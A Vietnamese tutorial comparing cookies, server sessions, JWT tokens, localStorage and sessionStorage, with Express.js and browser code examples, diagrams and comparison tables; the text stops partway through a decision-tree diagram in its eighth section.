# Token, Cookie, Session & Web Storage - Hướng dẫn Toàn diện

## Mục lục

1. [Tổng quan](#1-tổng-quan)
2. [Cookie](#2-cookie)
3. [Session](#3-session)
4. [Token (JWT)](#4-token-jwt)
5. [LocalStorage](#5-localstorage)
6. [SessionStorage](#6-sessionstorage)
7. [So sánh tổng hợp](#7-so-sánh-tổng-hợp)
8. [Khi nào dùng cái nào?](#8-khi-nào-dùng-cái-nào)
9. [Best Practices](#9-best-practices)
10. [Các vấn đề bảo mật](#10-các-vấn-đề-bảo-mật)

---

## 1. Tổng quan

### Vấn đề cần giải quyết

HTTP là **stateless protocol** - server không nhớ client giữa các requests. Vì vậy cần cơ chế để:

- **Xác thực (Authentication):** Biết user là ai
- **Lưu trữ trạng thái:** Giỏ hàng, preferences, form data
- **Duy trì phiên làm việc:** Không cần login lại mỗi request

### Các giải pháp

```
┌─────────────────────────────────────────────────────────────────┐
│                    PHƯƠNG THỨC LƯU TRỮ                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐ │
│  │   Cookie    │  │   Session   │  │         Token           │ │
│  │ (Client)    │  │  (Server)   │  │   (Client/Server)       │ │
│  └─────────────┘  └─────────────┘  └─────────────────────────┘ │
│                                                                 │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              Web Storage API (Client only)               │   │
│  │  ┌─────────────────┐    ┌─────────────────────────────┐ │   │
│  │  │  LocalStorage   │    │      SessionStorage         │ │   │
│  │  │  (Persistent)   │    │    (Tab-specific)           │ │   │
│  │  └─────────────────┘    └─────────────────────────────┘ │   │
│  └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Cookie

### Định nghĩa

**Cookie** là đoạn dữ liệu nhỏ được server gửi và lưu trên browser của user. Browser tự động gửi cookie kèm theo mỗi request đến cùng domain.

### Đặc điểm

| Thuộc tính      | Giá trị                      |
| --------------- | ---------------------------- |
| Dung lượng      | ~4KB mỗi cookie              |
| Số lượng        | ~50 cookies/domain           |
| Thời gian sống  | Có thể set expiration        |
| Gửi với request | Tự động gửi mỗi HTTP request |
| Truy cập từ JS  | Có (trừ khi httpOnly)        |
| Cross-domain    | Không (Same-Origin Policy)   |

### Cách hoạt động

```
1. Client gửi request đầu tiên
   ┌────────┐                    ┌────────┐
   │ Client │ ──── Request ────> │ Server │
   └────────┘                    └────────┘

2. Server gửi response với Set-Cookie header
   ┌────────┐                    ┌────────┐
   │ Client │ <── Set-Cookie ─── │ Server │
   └────────┘    sessionId=abc   └────────┘

3. Browser lưu cookie và gửi kèm mọi request sau
   ┌────────┐                    ┌────────┐
   │ Client │ ── Cookie: abc ──> │ Server │
   └────────┘                    └────────┘
```

### Các thuộc tính Cookie

```javascript
// Server-side (Express.js)
res.cookie("name", "value", {
  // Thời gian sống
  maxAge: 24 * 60 * 60 * 1000, // 1 ngày (milliseconds)
  expires: new Date("2024-12-31"), // Ngày hết hạn cụ thể

  // Bảo mật
  httpOnly: true, // Không truy cập được từ JavaScript
  secure: true, // Chỉ gửi qua HTTPS
  signed: true, // Cookie được ký để chống giả mạo

  // Phạm vi
  domain: ".example.com", // Áp dụng cho subdomain
  path: "/admin", // Chỉ gửi với path /admin/*

  // CSRF Protection
  sameSite: "strict", // strict | lax | none
});
```

### SameSite Attribute

| Giá trị  | Mô tả                                 | Use case           |
| -------- | ------------------------------------- | ------------------ |
| `strict` | Chỉ gửi cookie với same-site requests | Bảo mật cao nhất   |
| `lax`    | Gửi với top-level navigation (GET)    | Default, cân bằng  |
| `none`   | Gửi với mọi request (cần Secure)      | Cross-site (OAuth) |

### Code Examples

```javascript
// ===== SERVER-SIDE (Express.js) =====
const express = require("express");
const cookieParser = require("cookie-parser");

const app = express();
app.use(cookieParser("secret-key")); // Cho signed cookies

// Set cookie
app.get("/login", (req, res) => {
  // Cookie thường
  res.cookie("userId", "12345", {
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 ngày
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
  });

  // Signed cookie (chống giả mạo)
  res.cookie("sessionId", "abc123", {
    signed: true,
    httpOnly: true,
  });

  res.json({ message: "Logged in" });
});

// Đọc cookie
app.get("/profile", (req, res) => {
  const userId = req.cookies.userId; // Cookie thường
  const sessionId = req.signedCookies.sessionId; // Signed cookie

  res.json({ userId, sessionId });
});

// Xóa cookie
app.get("/logout", (req, res) => {
  res.clearCookie("userId");
  res.clearCookie("sessionId");
  res.json({ message: "Logged out" });
});

// ===== CLIENT-SIDE (JavaScript) =====
// Đọc cookies (chỉ non-httpOnly)
const cookies = document.cookie; // "name=value; name2=value2"

// Parse cookies
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) {
    return parts.pop().split(";").shift();
  }
  return null;
}

// Set cookie
document.cookie = "theme=dark; max-age=86400; path=/";

// Delete cookie
document.cookie = "theme=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
```

### Ưu điểm

✅ Tự động gửi với mỗi request  
✅ Có thể set httpOnly để bảo vệ khỏi XSS  
✅ Hỗ trợ expiration  
✅ Server có thể kiểm soát

### Nhược điểm

❌ Giới hạn dung lượng (~4KB)  
❌ Gửi với MỌI request (tăng bandwidth)  
❌ Dễ bị CSRF attack nếu không cấu hình đúng  
❌ Có thể bị chặn bởi browser

---

## 3. Session

### Định nghĩa

**Session** là cơ chế lưu trữ thông tin user trên SERVER. Client chỉ giữ một session ID (thường trong cookie), server dùng ID này để lookup data.

### Cách hoạt động

```
┌─────────────────────────────────────────────────────────────────┐
│                      SESSION FLOW                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Login Request                                                │
│     Client ────────────────────────────────> Server              │
│             { email, password }                                  │
│                                                                  │
│  2. Server tạo session, lưu vào store                           │
│     ┌─────────────────────────────────────────────────────┐     │
│     │  Session Store (Memory/Redis/Database)              │     │
│     │  ┌─────────────────────────────────────────────┐    │     │
│     │  │ sessionId: "abc123"                         │    │     │
│     │  │ data: { userId: 1, role: "admin", ... }     │    │     │
│     │  │ expires: "2024-01-01T00:00:00Z"             │    │     │
│     │  └─────────────────────────────────────────────┘    │     │
│     └─────────────────────────────────────────────────────┘     │
│                                                                  │
│  3. Server gửi session ID về client (trong cookie)              │
│     Client <──────────────────────────────── Server              │
│             Set-Cookie: sessionId=abc123                         │
│                                                                  │
│  4. Các request sau, client gửi kèm session ID                  │
│     Client ────────────────────────────────> Server              │
│             Cookie: sessionId=abc123                             │
│                                                                  │
│  5. Server lookup session từ store                              │
│     Server ──> Session Store ──> Trả về user data               │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Session Storage Options

| Storage      | Ưu điểm           | Nhược điểm                   | Use case        |
| ------------ | ----------------- | ---------------------------- | --------------- |
| **Memory**   | Nhanh, đơn giản   | Mất khi restart, không scale | Development     |
| **Redis**    | Nhanh, scale được | Cần setup riêng              | Production      |
| **Database** | Persistent        | Chậm hơn                     | Cần audit trail |
| **File**     | Đơn giản          | Chậm, không scale            | Small apps      |

### Code Examples

```javascript
// ===== EXPRESS-SESSION =====
const express = require("express");
const session = require("express-session");
const RedisStore = require("connect-redis").default;
const { createClient } = require("redis");

const app = express();

// Redis client
const redisClient = createClient({ url: "redis://localhost:6379" });
redisClient.connect();

// Session middleware
app.use(
  session({
    store: new RedisStore({ client: redisClient }),
    secret: "your-secret-key",
    name: "sessionId", // Tên cookie (default: connect.sid)
    resave: false, // Không save nếu không thay đổi
    saveUninitialized: false, // Không tạo session cho guest
    cookie: {
      secure: process.env.NODE_ENV === "production",
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000, // 1 ngày
      sameSite: "lax",
    },
  })
);

// Login - Tạo session
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email });
  if (!user || !(await user.comparePassword(password))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Lưu data vào session
  req.session.userId = user.id;
  req.session.role = user.role;
  req.session.loginTime = new Date();

  res.json({ message: "Logged in", user: { id: user.id, name: user.name } });
});

// Protected route - Kiểm tra session
app.get("/profile", (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: "Not authenticated" });
  }

  res.json({
    userId: req.session.userId,
    role: req.session.role,
    loginTime: req.session.loginTime,
  });
});

// Logout - Hủy session
app.post("/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: "Logout failed" });
    }
    res.clearCookie("sessionId");
    res.json({ message: "Logged out" });
  });
});

// Regenerate session (sau login để chống session fixation)
app.post("/login", (req, res) => {
  // ... validate user ...

  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: "Session error" });

    req.session.userId = user.id;
    res.json({ message: "Logged in" });
  });
});
```

### Session với Database (Sequelize)

```javascript
const session = require("express-session");
const SequelizeStore = require("connect-session-sequelize")(session.Store);
const { Sequelize } = require("sequelize");

const sequelize = new Sequelize("database", "user", "password", {
  dialect: "postgres",
});

const sessionStore = new SequelizeStore({
  db: sequelize,
  tableName: "sessions",
  checkExpirationInterval: 15 * 60 * 1000, // Cleanup mỗi 15 phút
  expiration: 24 * 60 * 60 * 1000, // 1 ngày
});

app.use(
  session({
    store: sessionStore,
    secret: "secret",
    resave: false,
    saveUninitialized: false,
  })
);

// Sync table
sessionStore.sync();
```

### Ưu điểm

✅ Data lưu trên server (an toàn hơn)  
✅ Có thể lưu data lớn  
✅ Server kiểm soát hoàn toàn  
✅ Dễ invalidate (logout, ban user)

### Nhược điểm

❌ Tốn tài nguyên server  
❌ Khó scale (cần shared session store)  
❌ Stateful - server phải nhớ state  
❌ Vấn đề với load balancing

---

## 4. Token (JWT)

### Định nghĩa

**JWT (JSON Web Token)** là chuẩn mở (RFC 7519) để truyền thông tin an toàn giữa các bên dưới dạng JSON object được ký số.

### Cấu trúc JWT

```
┌─────────────────────────────────────────────────────────────────┐
│                        JWT STRUCTURE                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.                          │
│  eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.                │
│  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c                    │
│                                                                  │
│  ├─────────── Header ────────────┤                              │
│  │  {                            │                              │
│  │    "alg": "HS256",            │  ← Thuật toán ký             │
│  │    "typ": "JWT"               │  ← Loại token                │
│  │  }                            │                              │
│  ├─────────────────────────────────┤                            │
│                                                                  │
│  ├─────────── Payload ───────────┤                              │
│  │  {                            │                              │
│  │    "sub": "1234567890",       │  ← Subject (user ID)         │
│  │    "name": "John Doe",        │  ← Custom claims             │
│  │    "role": "admin",           │                              │
│  │    "iat": 1516239022,         │  ← Issued at                 │
│  │    "exp": 1516242622          │  ← Expiration                │
│  │  }                            │                              │
│  ├─────────────────────────────────┤                            │
│                                                                  │
│  ├─────────── Signature ─────────┤                              │
│  │  HMACSHA256(                  │                              │
│  │    base64(header) + "." +     │                              │
│  │    base64(payload),           │                              │
│  │    secret                     │                              │
│  │  )                            │                              │
│  └───────────────────────────────┘                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Cách hoạt động

```
┌─────────────────────────────────────────────────────────────────┐
│                        JWT FLOW                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Login                                                        │
│     Client ──── { email, password } ────> Server                │
│                                                                  │
│  2. Server verify credentials, tạo JWT                          │
│     Server: jwt.sign({ userId, role }, secret, { expiresIn })   │
│                                                                  │
│  3. Server trả JWT về client                                    │
│     Client <──── { token: "eyJhbG..." } ──── Server             │
│                                                                  │
│  4. Client lưu token (localStorage/cookie/memory)               │
│                                                                  │
│  5. Các request sau, client gửi token trong header              │
│     Client ──── Authorization: Bearer eyJhbG... ────> Server    │
│                                                                  │
│  6. Server verify token (KHÔNG cần lookup database)             │
│     Server: jwt.verify(token, secret)                           │
│     → Decode payload → Lấy userId, role                         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Code Examples

```javascript
// ===== SERVER-SIDE =====
const jwt = require("jsonwebtoken");

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_EXPIRE = "15m"; // Access token: ngắn
const REFRESH_SECRET = process.env.REFRESH_SECRET;
const REFRESH_EXPIRE = "7d"; // Refresh token: dài

// Tạo tokens
const generateTokens = (user) => {
  const accessToken = jwt.sign(
    {
      userId: user.id,
      role: user.role,
      type: "access",
    },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRE }
  );

  const refreshToken = jwt.sign(
    {
      userId: user.id,
      type: "refresh",
    },
    REFRESH_SECRET,
    { expiresIn: REFRESH_EXPIRE }
  );

  return { accessToken, refreshToken };
};

// Login
app.post("/auth/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email });
  if (!user || !(await user.comparePassword(password))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  const { accessToken, refreshToken } = generateTokens(user);

  // Lưu refresh token vào database (để có thể revoke)
  await RefreshToken.create({
    token: refreshToken,
    userId: user.id,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });

  // Gửi refresh token qua httpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  res.json({
    accessToken,
    user: { id: user.id, name: user.name, role: user.role },
  });
});

// Middleware verify token
const authenticate = (req, res, next) => {
  const authHeader = req.headers.authorization;

  if (!authHeader?.startsWith("Bearer ")) {
    return res.status(401).json({ error: "No token provided" });
  }

  const token = authHeader.split(" ")[1];

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({ error: "Token expired", code: "TOKEN_EXPIRED" });
    }
    return res.status(401).json({ error: "Invalid token" });
  }
};

// Refresh token
app.post("/auth/refresh", async (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken) {
    return res.status(401).json({ error: "Refresh token required" });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);

    // Kiểm tra token có trong database không (chưa bị revoke)
    const storedToken = await RefreshToken.findOne({
      token: refreshToken,
      userId: decoded.userId,
    });

    if (!storedToken) {
      return res.status(401).json({ error: "Invalid refresh token" });
    }

    // Tạo access token mới
    const user = await User.findById(decoded.userId);
    const accessToken = jwt.sign({ userId: user.id, role: user.role, type: "access" }, JWT_SECRET, {
      expiresIn: JWT_EXPIRE,
    });

    res.json({ accessToken });
  } catch (error) {
    return res.status(401).json({ error: "Invalid refresh token" });
  }
});

// Logout - Revoke refresh token
app.post("/auth/logout", authenticate, async (req, res) => {
  const { refreshToken } = req.cookies;

  // Xóa refresh token khỏi database
  await RefreshToken.deleteOne({ token: refreshToken });

  res.clearCookie("refreshToken");
  res.json({ message: "Logged out" });
});

// Protected route
app.get("/profile", authenticate, async (req, res) => {
  const user = await User.findById(req.user.userId);
  res.json({ user });
});

// ===== CLIENT-SIDE =====
class AuthService {
  constructor() {
    this.accessToken = null;
  }

  async login(email, password) {
    const response = await fetch("/auth/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      credentials: "include", // Để nhận cookie
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    this.accessToken = data.accessToken;
    return data;
  }

  async fetchWithAuth(url, options = {}) {
    // Thêm token vào header
    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${this.accessToken}`,
      },
      credentials: "include",
    });

    // Nếu token hết hạn, refresh và retry
    if (response.status === 401) {
      const data = await response.json();
      if (data.code === "TOKEN_EXPIRED") {
        await this.refreshToken();
        return this.fetchWithAuth(url, options); // Retry
      }
    }

    return response;
  }

  async refreshToken() {
    const response = await fetch("/auth/refresh", {
      method: "POST",
      credentials: "include",
    });

    if (!response.ok) {
      // Refresh token cũng hết hạn → logout
      this.logout();
      throw new Error("Session expired");
    }

    const data = await response.json();
    this.accessToken = data.accessToken;
  }

  logout() {
    this.accessToken = null;
    fetch("/auth/logout", { method: "POST", credentials: "include" });
  }
}
```

### Access Token vs Refresh Token

| Thuộc tính      | Access Token              | Refresh Token    |
| --------------- | ------------------------- | ---------------- |
| Thời gian sống  | Ngắn (15m - 1h)           | Dài (7d - 30d)   |
| Lưu ở đâu       | Memory / localStorage     | httpOnly Cookie  |
| Gửi với request | Mọi API request           | Chỉ khi refresh  |
| Chứa thông tin  | userId, role, permissions | Chỉ userId       |
| Revoke          | Không cần (tự hết hạn)    | Lưu DB để revoke |

### Ưu điểm

✅ Stateless - Server không cần lưu state  
✅ Scale dễ dàng (không cần shared session)  
✅ Cross-domain / Microservices friendly  
✅ Mobile app friendly  
✅ Chứa được thông tin (claims)

### Nhược điểm

❌ Không thể revoke ngay lập tức (phải chờ hết hạn)  
❌ Token size lớn hơn session ID  
❌ Payload có thể decode được (không mã hóa)  
❌ Phức tạp hơn để implement đúng

---

## 5. LocalStorage

### Định nghĩa

**LocalStorage** là Web Storage API cho phép lưu trữ dữ liệu key-value trên browser, dữ liệu tồn tại vĩnh viễn cho đến khi bị xóa thủ công.

### Đặc điểm

| Thuộc tính      | Giá trị                         |
| --------------- | ------------------------------- |
| Dung lượng      | ~5-10MB (tùy browser)           |
| Thời gian sống  | Vĩnh viễn (không tự hết hạn)    |
| Phạm vi         | Tất cả tabs/windows cùng origin |
| Gửi với request | KHÔNG tự động gửi               |
| Truy cập        | Chỉ từ JavaScript               |
| Đồng bộ         | Synchronous API                 |

### Cách hoạt động

```
┌─────────────────────────────────────────────────────────────────┐
│                     LOCALSTORAGE                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Origin: https://example.com                                     │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  LocalStorage                                            │    │
│  │  ┌─────────────────┬───────────────────────────────┐    │    │
│  │  │      Key        │           Value               │    │    │
│  │  ├─────────────────┼───────────────────────────────┤    │    │
│  │  │  "theme"        │  "dark"                       │    │    │
│  │  │  "user"         │  '{"id":1,"name":"John"}'     │    │    │
│  │  │  "cart"         │  '[{"id":1,"qty":2}]'         │    │    │
│  │  │  "accessToken"  │  "eyJhbGciOiJIUzI1NiIs..."    │    │    │
│  │  └─────────────────┴───────────────────────────────┘    │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  ✓ Tab 1 có thể đọc/ghi                                         │
│  ✓ Tab 2 có thể đọc/ghi (cùng data)                             │
│  ✓ Đóng browser, mở lại vẫn còn                                 │
│  ✗ https://other.com KHÔNG truy cập được                        │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Code Examples

```javascript
// ===== BASIC OPERATIONS =====

// Set item
localStorage.setItem("theme", "dark");
localStorage.setItem("fontSize", "16");

// Get item
const theme = localStorage.getItem("theme"); // 'dark'
const missing = localStorage.getItem("notExist"); // null

// Remove item
localStorage.removeItem("theme");

// Clear all
localStorage.clear();

// Get number of items
const count = localStorage.length;

// Get key by index
const firstKey = localStorage.key(0);

// Iterate all items
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(`${key}: ${value}`);
}

// ===== STORING OBJECTS/ARRAYS =====

// Lưu object (phải stringify)
const user = { id: 1, name: "John", email: "john@example.com" };
localStorage.setItem("user", JSON.stringify(user));

// Đọc object (phải parse)
const storedUser = JSON.parse(localStorage.getItem("user"));
console.log(storedUser.name); // 'John'

// Lưu array
const cart = [
  { productId: 1, quantity: 2 },
  { productId: 3, quantity: 1 },
];
localStorage.setItem("cart", JSON.stringify(cart));

// Đọc array
const storedCart = JSON.parse(localStorage.getItem("cart") || "[]");

// ===== UTILITY CLASS =====

class Storage {
  static set(key, value) {
    try {
      const serialized = JSON.stringify(value);
      localStorage.setItem(key, serialized);
      return true;
    } catch (error) {
      console.error("Storage set error:", error);
      return false;
    }
  }

  static get(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (error) {
      console.error("Storage get error:", error);
      return defaultValue;
    }
  }

  static remove(key) {
    localStorage.removeItem(key);
  }

  static clear() {
    localStorage.clear();
  }

  static has(key) {
    return localStorage.getItem(key) !== null;
  }
}

// Sử dụng
Storage.set("user", { id: 1, name: "John" });
const user = Storage.get("user");
const theme = Storage.get("theme", "light"); // default value

// ===== STORAGE EVENT (Cross-tab communication) =====

// Tab khác thay đổi localStorage → nhận event
window.addEventListener("storage", (event) => {
  console.log("Storage changed:");
  console.log("Key:", event.key);
  console.log("Old value:", event.oldValue);
  console.log("New value:", event.newValue);
  console.log("URL:", event.url);

  // Ví dụ: Sync logout across tabs
  if (event.key === "logout") {
    window.location.href = "/login";
  }
});

// Trigger logout ở tất cả tabs
function logoutAllTabs() {
  localStorage.setItem("logout", Date.now().toString());
  localStorage.removeItem("logout");
}

// ===== LƯU TOKEN =====

// Lưu access token
const saveToken = (token) => {
  localStorage.setItem("accessToken", token);
};

// Lấy token cho API calls
const getToken = () => {
  return localStorage.getItem("accessToken");
};

// Fetch với token
const fetchWithAuth = async (url, options = {}) => {
  const token = getToken();

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: token ? `Bearer ${token}` : "",
    },
  });
};
```

### Ưu điểm

✅ Dung lượng lớn (~5-10MB)  
✅ Dữ liệu persistent (không mất khi đóng browser)  
✅ API đơn giản  
✅ Không gửi với mỗi request (tiết kiệm bandwidth)  
✅ Đồng bộ giữa các tabs

### Nhược điểm

❌ Chỉ lưu được strings  
❌ Synchronous (có thể block main thread)  
❌ Dễ bị XSS attack (JavaScript có thể đọc)  
❌ Không có expiration tự động  
❌ Không gửi tự động với request

---

## 6. SessionStorage

### Định nghĩa

**SessionStorage** tương tự LocalStorage nhưng dữ liệu chỉ tồn tại trong phiên làm việc của tab/window hiện tại.

### Đặc điểm

| Thuộc tính      | Giá trị                 |
| --------------- | ----------------------- |
| Dung lượng      | ~5-10MB                 |
| Thời gian sống  | Đến khi đóng tab/window |
| Phạm vi         | Chỉ tab/window hiện tại |
| Gửi với request | KHÔNG                   |
| Truy cập        | Chỉ từ JavaScript       |

### So sánh với LocalStorage

```
┌─────────────────────────────────────────────────────────────────┐
│              LOCALSTORAGE vs SESSIONSTORAGE                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Browser Window                                                  │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │                                                          │    │
│  │  Tab 1 (example.com)    Tab 2 (example.com)             │    │
│  │  ┌──────────────────┐   ┌──────────────────┐            │    │
│  │  │ SessionStorage   │   │ SessionStorage   │            │    │
│  │  │ ┌──────────────┐ │   │ ┌──────────────┐ │            │    │
│  │  │ │ formData: A  │ │   │ │ formData: B  │ │  ← Riêng   │    │
│  │  │ └──────────────┘ │   │ └──────────────┘ │    biệt    │    │
│  │  └──────────────────┘   └──────────────────┘            │    │
│  │                                                          │    │
│  │  ┌──────────────────────────────────────────────────┐   │    │
│  │  │              LocalStorage (Shared)                │   │    │
│  │  │  ┌────────────────────────────────────────────┐  │   │    │
│  │  │  │ user: {"id":1}  │  theme: "dark"           │  │   │    │
│  │  │  └────────────────────────────────────────────┘  │   │    │
│  │  └──────────────────────────────────────────────────┘   │    │
│  │                                                          │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  Đóng Tab 1 → SessionStorage Tab 1 bị xóa                       │
│  Đóng Browser → Tất cả SessionStorage bị xóa                    │
│                 LocalStorage vẫn còn                             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Code Examples

```javascript
// ===== BASIC OPERATIONS (giống LocalStorage) =====

sessionStorage.setItem("key", "value");
const value = sessionStorage.getItem("key");
sessionStorage.removeItem("key");
sessionStorage.clear();

// ===== USE CASES =====

// 1. Form data tạm thời (tránh mất khi refresh)
const saveFormData = () => {
  const formData = {
    name: document.getElementById("name").value,
    email: document.getElementById("email").value,
    message: document.getElementById("message").value,
  };
  sessionStorage.setItem("contactForm", JSON.stringify(formData));
};

const restoreFormData = () => {
  const saved = sessionStorage.getItem("contactForm");
  if (saved) {
    const formData = JSON.parse(saved);
    document.getElementById("name").value = formData.name || "";
    document.getElementById("email").value = formData.email || "";
    document.getElementById("message").value = formData.message || "";
  }
};

// Auto-save khi user nhập
document.querySelectorAll("input, textarea").forEach((el) => {
  el.addEventListener("input", saveFormData);
});

// Restore khi load page
window.addEventListener("load", restoreFormData);

// Clear sau khi submit
form.addEventListener("submit", () => {
  sessionStorage.removeItem("contactForm");
});

// 2. Wizard/Multi-step form
class FormWizard {
  constructor() {
    this.storageKey = "wizardData";
  }

  saveStep(step, data) {
    const allData = this.getAllData();
    allData[`step${step}`] = data;
    sessionStorage.setItem(this.storageKey, JSON.stringify(allData));
  }

  getStep(step) {
    const allData = this.getAllData();
    return allData[`step${step}`] || {};
  }

  getAllData() {
    const data = sessionStorage.getItem(this.storageKey);
    return data ? JSON.parse(data) : {};
  }

  clear() {
    sessionStorage.removeItem(this.storageKey);
  }
}

const wizard = new FormWizard();
wizard.saveStep(1, { name: "John", email: "john@example.com" });
wizard.saveStep(2, { address: "123 Main St", city: "NYC" });

// 3. Page state (scroll position, filters)
// Lưu scroll position
window.addEventListener("beforeunload", () => {
  sessionStorage.setItem("scrollPosition", window.scrollY.toString());
});

// Restore scroll position
window.addEventListener("load", () => {
  const scrollPos = sessionStorage.getItem("scrollPosition");
  if (scrollPos) {
    window.scrollTo(0, parseInt(scrollPos));
  }
});

// 4. One-time messages (flash messages)
const showFlashMessage = (message, type = "info") => {
  sessionStorage.setItem("flashMessage", JSON.stringify({ message, type }));
};

const displayFlashMessage = () => {
  const flash = sessionStorage.getItem("flashMessage");
  if (flash) {
    const { message, type } = JSON.parse(flash);
    // Hiển thị message
    alert(`${type}: ${message}`);
    // Xóa sau khi hiển thị
    sessionStorage.removeItem("flashMessage");
  }
};

// Redirect với message
showFlashMessage("Profile updated successfully!", "success");
window.location.href = "/profile";

// Trang mới hiển thị message
displayFlashMessage();

// 5. Tab-specific authentication state
// Mỗi tab có thể login với account khác nhau
const setTabAuth = (user, token) => {
  sessionStorage.setItem("currentUser", JSON.stringify(user));
  sessionStorage.setItem("tabToken", token);
};

const getTabAuth = () => {
  return {
    user: JSON.parse(sessionStorage.getItem("currentUser") || "null"),
    token: sessionStorage.getItem("tabToken"),
  };
};
```

### Ưu điểm

✅ Tự động xóa khi đóng tab (không cần cleanup)  
✅ Isolated giữa các tabs (privacy)  
✅ Tốt cho dữ liệu tạm thời  
✅ Dung lượng lớn (~5-10MB)

### Nhược điểm

❌ Mất dữ liệu khi đóng tab  
❌ Không share được giữa các tabs  
❌ Dễ bị XSS attack  
❌ Chỉ lưu strings

---

## 7. So sánh tổng hợp

### Bảng so sánh chi tiết

| Tiêu chí            | Cookie           | Session        | JWT              | LocalStorage | SessionStorage |
| ------------------- | ---------------- | -------------- | ---------------- | ------------ | -------------- |
| **Lưu ở đâu**       | Client           | Server         | Client           | Client       | Client         |
| **Dung lượng**      | ~4KB             | Không giới hạn | ~8KB (recommend) | ~5-10MB      | ~5-10MB        |
| **Thời gian sống**  | Có thể set       | Server control | Có expiry        | Vĩnh viễn    | Đóng tab       |
| **Gửi với request** | Tự động          | Session ID     | Manual (header)  | Không        | Không          |
| **Truy cập từ JS**  | Có\*             | Không          | Có               | Có           | Có             |
| **XSS vulnerable**  | Không (httpOnly) | Không          | Có\*\*           | Có           | Có             |
| **CSRF vulnerable** | Có               | Có             | Không\*\*\*      | Không        | Không          |
| **Stateless**       | -                | Không          | Có               | -            | -              |
| **Scale**           | -                | Khó            | Dễ               | -            | -              |
| **Cross-domain**    | Không            | Không          | Có               | Không        | Không          |
| **Mobile friendly** | Khó              | Khó            | Dễ               | Không có     | Không có       |

\*Trừ khi httpOnly  
**Nếu lưu trong localStorage  
\***Nếu gửi qua header, không phải cookie

### Visual Comparison

```
┌─────────────────────────────────────────────────────────────────┐
│                    STORAGE COMPARISON                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Dung lượng:                                                     │
│  Cookie         ████ 4KB                                         │
│  LocalStorage   ████████████████████████████████████ 5-10MB     │
│  SessionStorage ████████████████████████████████████ 5-10MB     │
│                                                                  │
│  Thời gian sống:                                                 │
│  Cookie         [====Configurable====]                           │
│  Session        [==Server controls==]                            │
│  JWT            [===Has expiry===]                               │
│  LocalStorage   [==========Forever==========]                    │
│  SessionStorage [==Tab only==]                                   │
│                                                                  │
│  Bảo mật (XSS):                                                  │
│  Cookie (httpOnly)  ████████████ Tốt                            │
│  Session            ████████████ Tốt                            │
│  JWT (in cookie)    ████████████ Tốt                            │
│  JWT (localStorage) ████ Kém                                     │
│  LocalStorage       ████ Kém                                     │
│  SessionStorage     ████ Kém                                     │
│                                                                  │
│  Scalability:                                                    │
│  Session            ████ Khó (stateful)                         │
│  JWT                ████████████ Dễ (stateless)                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8. Khi nào dùng cái nào?

### Decision Tree

```
                        Bạn cần lưu gì?
                              │
              ┌───────────────┼───────────────┐
              │               │               │
        Authentication    User Data      Temp Data
              │               │               │
              ▼               ▼               ▼
        ┌─────────┐     ┌─────────┐     ┌─────────┐
        │ Cần     │     │ Cần     │     │ Cần     │
        │ scale?  │     │ persist?│     │ persist?│
        └────┬────┘     └────┬────┘     └────┬────┘
             │               │               │
        ┌────┴────┐     ┌────┴────┐     ┌────┴────┐
        │         │     │         │     │         │
